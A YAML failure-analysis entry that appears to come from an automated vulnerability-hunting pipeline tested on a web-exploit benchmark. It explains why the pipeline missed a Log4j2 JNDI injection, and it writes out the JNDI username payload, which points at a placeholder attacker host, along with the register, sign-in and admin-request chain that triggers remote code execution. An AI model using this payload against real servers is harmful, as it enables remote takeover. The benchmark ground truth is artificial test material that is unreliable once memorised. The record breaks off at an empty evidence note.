- vuln: white-jotter-004
  failure_mode: modeller_failed_unit-fault_binding
  root_cause:
    type: kb_coverage_gap
    combination_of: [design_defect]
    extended_description: |-
      The ground truth is a JNDI injection through a crafted username. The exploit registers an account whose username is ${jndi:rmi://<attacker-host>:<port>/<name>} at /api/register, signs in, then requests /api/admin/user; the server logs the caller-controlled username through a vulnerable Log4j2 configuration, contacts the attacker's lookup service, and the verifier observes the shared RCE canary (white-jotter-004 metadata.json, report.md, exploits/exploit.py, verify/verify.py). The GT location /api/admin/user is the unauthorized access that triggers the logged username.

      Both owning units were modelled this iteration. Service:register produced two threats: identifier substitution through the registration identifier member, and the nested role-array write; both were dispatched and the role write identified white-jotter-007. Service:user-administration produced threat-1 "credential replacement authorised by naming the account" (risk 12), which is a real but different fault. Neither unit binds a logging sink, a lookup evaluation, or caller-controlled log fields.

      No hunting artifact anywhere in the project mentions JNDI, log4j or Log4Shell: a case-insensitive grep over the whole threat-modeller and hunter/pod tree returns zero. No spec tests a JNDI-shaped username at registration or login, and no pod registers one.

      The suite has no class for the chain. skills/web-vulnerability-testing/rce/SKILL.md covers command wrappers, template engines and evaluators, native unmarshalling, media/document pipelines, fetch-reached services and container/cluster escalation; it has no logging-framework lookup variant. A grep of skills/ finds no jndi, log4j or Log4Shell leaf. The knowledge base therefore cannot bind "caller-controlled username -> log record -> JNDI lookup" even in principle, so the modeller had no class to select.

      A design gap compounds it: the unit projection and technical sharpening never inventory the logging dependency or the fields that reach it. The application's pom.xml declares spring-boot-starter-log4j2 and ships log4j2.xml, but no unit model records the logging framework, its version, or which caller-controlled values are logged. The RCE class does ask for a dependency inventory where the runtime is identifiable; that step was never applied to the logging stack.

      The dispatch starvation also applies to this unit (Service:user-administration is seventh of 14 by risk and its only threat was still in produced/ at the stop), but that threat is credential reset, not JNDI: even dispatched, it would not have sought a logging-sink lookup. The GT miss is the unbound fault and the absent class.
  diagnosis_overview: |-
    white-jotter-004 is a JNDI/Log4j2 RCE: register username ${jndi:rmi://...}, sign in, access /api/admin/user, and the server logs the username through a vulnerable Log4j2, contacting the attacker's lookup service.
    Both owning units were modelled this iteration (Service:register and Service:user-administration), but neither binds a logging-sink fault: register's threats are identifier substitution and nested role write, user-administration's is credential reset by name. No model, threat, spec, pod or note in the project mentions JNDI, log4j or Log4Shell.
    The suite has no logging-sink/JNDI class: the rce parent lists command wrappers, evaluators, decoders, media pipelines, fetch-reached services and container escalation, with no logging-framework lookup variant. The KB cannot bind the chain even in principle.
    The application declares spring-boot-starter-log4j2, but no unit inventories the logging dependency or which caller-controlled fields reach it. Typed root cause: a knowledge-base coverage gap for logging-sink JNDI lookup (kb_coverage_gap), combined with a design gap that never inventories the logging stack (design_defect).
  evidences:
  - source: ground_truth
    ref: /root/WebExploitBench/white-jotter/vulnerability/white-jotter-004/metadata.json
    note: |-
